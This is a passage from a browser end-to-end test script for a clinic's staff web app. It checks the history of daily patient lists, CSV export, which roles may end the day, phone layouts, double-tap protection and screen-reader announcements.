        if (region?.textContent.trim()) window.liveWrites.push({ text: region.textContent.trim(), shown: region.checkVisibility({ visibilityProperty: true }) });
      }
    }).observe(document.body, { childList: true, subtree: true, characterData: true });
  });
  const heard = async (branch) => {
    await ph.evaluate(() => { window.liveWrites = []; });
    await ph.locator('select[aria-label="Branch"]').selectOption({ label: branch });
    await ph.waitForSelector('section[aria-label="Days"][aria-busy="false"]');
    assert.ok((await historyLines(ph)).every((t) => t.includes(` – ${branch} – `)), `${branch}: its lines only`);
    const count = await ph.locator('.page-head p').innerText();
    await ph.waitForFunction((c) => window.liveWrites.some((w) => w.shown && w.text === c), count, { timeout: 3000 }).catch(() => {});
    const writes = await ph.evaluate(() => window.liveWrites);
    assert.ok(writes.some((w) => w.shown && w.text === count), `${branch}: "${count}" is written to a live region that is shown: ${JSON.stringify(writes)}`);
    return count;
  };
  await heard('North Nazimabad');
  await heard('Gulshan (RJ Mall)');
  // The same count for sure: a month before the first day has no lists at any branch.
  await ph.locator('input[aria-label="Month"]').fill('2020-01');
  await ph.locator('.page-head p', { hasText: /^0 days match these filters$/ }).waitFor();
  assert.equal(await heard('North Nazimabad'), '0 days match these filters', 'the same count after a branch change, still read out');
  await ph.getByRole('button', { name: 'Clear filters' }).click();
  await ph.waitForFunction(() => new Set([...document.querySelectorAll('.day-history-list a')].map((a) => a.textContent.split(' – ')[1])).size > 1);
  // The saved day, with Download for a role with export rights.
  await ph.goto(BASE + `#/staff/day-history?branch=2&date=${ended.iso}`);
  await ph.waitForSelector('.day-copy table.sheet tbody tr');
  const [download] = await Promise.all([ph.waitForEvent('download'), ph.getByRole('button', { name: 'Download (CSV)' }).click()]);
  assert.equal(download.suggestedFilename(), `aaj-ki-list_North-Nazimabad_${ended.iso}_saved.csv`);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '').split('\n');
  assert.equal(csv[0], 'serial,token,patient,mr_number,type,braces_month,treatment,status,group,doctors,details,dues,invoice,notes,phone');
  assert.equal(csv.length, 1 + await ph.locator('.day-copy tbody tr').count(), 'one line per row of the copy');
});
await step('A role without "End the day" sees no button (the accountant; a front desk whose box is unticked), and still has the History', async () => {
  await tryAnotherRole(ph);
  await loginAs(ph, 'Accountant');
  await ph.goto(BASE + '#/staff/sheet?branch=2');
  await ph.waitForSelector('table.sheet tbody tr');
  assert.equal(await ph.getByRole('button', { name: 'End the day' }).count(), 0, 'accountant: no "End the day"');
  assert.equal(await ph.getByRole('link', { name: 'History of Aaj ki List' }).count(), 1, 'accountant: the History is there');
  await tryAnotherRole(ph);
  await loginAs(ph, 'Dr. Ali Rashid');
  await ph.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-gul', 'sheet.end_day', false); });
  await tryAnotherRole(ph);
  await loginAs(ph, 'Front desk \\(Gulshan\\)');
  await ph.goto(BASE + '#/staff/sheet');
  await ph.waitForSelector('table.sheet tbody tr');
  assert.equal(await ph.getByRole('button', { name: 'End the day' }).count(), 0, 'front desk with the box unticked: no "End the day"');
  const refused = await ph.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    try { await state.data.endDay({ branchId: 1, date: localISO() }); return 'ended'; } catch (e) { return e.message; }
  });
  assert.match(refused, /^NOT_ALLOWED: ending the day needs "End the day on the Aaj ki List"/, 'and the data layer says no');
});
const phd = await newPage({ width: 390, height: 844 });
await step('phone: the History of Aaj ki List and a saved day fit the screen', async () => {
  await loginAs(phd, 'Front desk \\(North Nazimabad\\)');
  const ended = await dayInfo(phd, -5);
  await phd.goto(BASE + '#/staff/day-history');
  await phd.waitForSelector('.day-history-list a');
  assert.ok(await phd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'no sideways scroll of the page');
  await shot(phd, '26-history-phone');
  await phd.goto(BASE + `#/staff/day-history?branch=2&date=${ended.iso}`);
  await phd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.ok(await phd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the table scrolls inside its box, not the page');
  await shot(phd, '27-history-saved-day-phone');
});
const ptap = await newPage({ width: 375, height: 667 }, { hasTouch: true, isMobile: true });
await step('phone: a quick double tap on "End the day" does not end the day (the dialog\'s own button is off for half a second)', async () => {
  await loginAs(ptap, 'Front desk \\(North Nazimabad\\)');
  await ptap.goto(BASE + '#/staff/sheet');
  await ptap.waitForSelector('table.sheet tbody tr.is-checkup');
  const button = ptap.getByRole('button', { name: 'End the day' });
  const inDialog = ptap.locator('.modal').getByRole('button', { name: 'End the day' });
  const ended = () => ptap.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return !!(await state.data.dayClosing({ branchId: 2, date: localISO() }));
  });
  // Where the dialog's "End the day" opens (on a phone it can be right where the toolbar's button is, as at this size).
  await button.scrollIntoViewIfNeeded();
  await button.tap();
  await inDialog.waitFor();
  const target = await inDialog.boundingBox();
  await ptap.keyboard.press('Escape');
  await ptap.locator('.modal').waitFor({ state: 'detached' });
  // The double tap: the first opens the dialog, the second (150 ms later) lands on the dialog's "End the day".
  const from = await button.boundingBox();
  const t0 = Date.now();
  await ptap.touchscreen.tap(from.x + from.width / 2, from.y + from.height / 2);
  await ptap.waitForTimeout(150);
  await ptap.touchscreen.tap(target.x + target.width / 2, target.y + target.height / 2);
  const gap = Date.now() - t0;
  await ptap.waitForTimeout(400);
  assert.equal(await ptap.locator('.modal').count(), 1, `the dialog is still open (taps ${gap} ms apart)`);
  assert.equal(await ptap.locator('.toast:has-text("Day ended")').count(), 0, 'no "Day ended" toast');
  assert.equal(await ended(), false, 'the day was not ended');
  await shot(ptap, '28-phone-double-tap-dialog-open');
  // A tap after that half second ends the day as usual.
  await inDialog.tap();
  await ptap.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  assert.equal(await ended(), true);
});
const pend = await newPage();
await step('End the day: a list with nobody on it asks first; ending an earlier day opens today (not the day after it); the note is written once the dialog has closed', async () => {
  await loginAs(pend, 'Front desk \\(North Nazimabad\\)');
  const today = await dayInfo(pend, 0);
  const old = await dayInfo(pend, -2);
  await pend.goto(BASE + `#/staff/sheet?branch=2&date=${old.iso}`);
  await pend.waitForSelector('table.sheet tbody .empty');
  assert.equal(await pend.locator('input[aria-label="Date"]').getAttribute('min'), '2024-01-01', 'the date box starts where end_day() does');
  await pend.getByRole('button', { name: 'End the day' }).click();
  const m = pend.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('p').first().innerText(), 'There is nobody on this list. End the day anyway?');
  assert.match(await m.innerText(), new RegExp(`After that the list for ${today.label} opens`));
  // Every change of the note's live region, and whether a dialog was open then (the page behind a dialog is hidden from screen readers).
  await pend.evaluate(() => {
    const region = document.querySelector('.day-end-live');
    window.noteWrites = [];
    new MutationObserver(() => window.noteWrites.push({ text: region.textContent, dialog: !!document.querySelector('.modal') }))
      .observe(region, { childList: true, subtree: true, characterData: true });
  });
  await m.getByRole('button', { name: 'End the day' }).click();
  await pend.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pend.waitForFunction((d) => document.querySelector('input[aria-label="Date"]')?.value === d, today.iso);
  await pend.locator('.day-end-note', { hasText: `${old.label} was ended` }).waitFor();
  assert.equal((await pend.locator('.day-end-note').innerText()).trim(),
    `${old.label} was ended and its list saved in History. This is the list for ${today.label}. See the saved copy · Back to ${old.label}`);
  const writes = await pend.evaluate(() => window.noteWrites);
  assert.ok(writes.length > 0 && writes.every((w) => !w.dialog), `written after the dialog closed: ${JSON.stringify(writes)}`);
  assert.equal(await pend.locator('.day-end-live').evaluate((el) => `${el.getAttribute('role')} ${el.getAttribute('aria-live')} ${el.contains(document.querySelector('.day-end-note'))}`),
    'status polite true', 'into a polite live region that was on the page already');
  assert.equal(await pend.getByRole('button', { name: 'End the day' }).isVisible(), true, 'today can be ended too');
  await shot(pend, '29-earlier-day-ended-opens-today');
});
await step('End the day with "All branches": a hint where the button would be; the button is back once one branch is chosen', async () => {
  await tryAnotherRole(pend);
  await loginAs(pend, 'Dr. Ali Rashid');
  await pend.goto(BASE + '#/staff/sheet?branch=all');
  await pend.waitForSelector('table.sheet tbody tr');
  const hint = pend.locator('.sheet-head').getByText('Choose one branch to end its day.');
  await hint.waitFor(); // (visible)
  assert.equal(await pend.getByRole('button', { name: 'End the day' }).count(), 0, 'no button for every branch at once');
  await pend.locator('select[aria-label="Branch"]').selectOption({ label: 'North Nazimabad' });
  await pend.getByRole('button', { name: 'End the day' }).waitFor();
  assert.equal(await hint.isVisible(), false, 'the hint goes away');
});
await pend.close();
const pmid = await newPage();
await step('End the day after midnight: a page opened before midnight says what day it is now and which day is being ended', async () => {
  await loginAs(pmid, 'Front desk \\(North Nazimabad\\)');
  await pmid.goto(BASE + '#/staff/sheet');
  await pmid.waitForSelector('table.sheet tbody tr.is-checkup');
  const today = await dayInfo(pmid, 0);
  const tomorrow = await dayInfo(pmid, 1);
  // The page stays open until five past midnight, Pakistan time.
  await pmid.clock.setFixedTime(new Date(`${tomorrow.iso}T00:05:00+05:00`));
  await pmid.getByRole('button', { name: 'End the day' }).click();
  const m = pmid.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('p.alert-warning').innerText(), `It is now ${tomorrow.label}; you are ending ${today.label}.`);
  assert.match(await m.innerText(), new RegExp(`After that the list for ${tomorrow.label} opens`));
  await shot(pmid, '30-end-the-day-after-midnight');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await pmid.close();

await browser.close();
if (errors.length) { console.log('Browser errors:\n  ' + [...new Set(errors)].join('\n  ')); process.exitCode = 1; }
console.log(`${passed} checks passed`);
